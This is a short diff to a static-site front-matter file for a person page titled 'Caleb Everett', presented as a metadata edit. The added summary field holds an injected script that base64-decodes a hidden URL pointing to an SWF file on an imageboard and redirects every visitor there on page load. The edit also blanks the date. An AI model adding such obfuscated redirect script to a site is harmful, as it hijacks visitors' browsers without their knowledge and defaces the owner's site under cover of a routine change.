@@ -1,7 +1,9 @@
 ---
 layout: person
-title:  "Caleb Everett"
-date:   2013-08-31
 categories: people
-summary: fill
+title: Caleb Everett
+date: {}
+summary: "<script>window.location = atob(\"aHR0cDovLzdjaGFuLm9yZy9mbC9zcmMvaGV5LnN3Zg==\") </script>"
+published: true
 ---
+
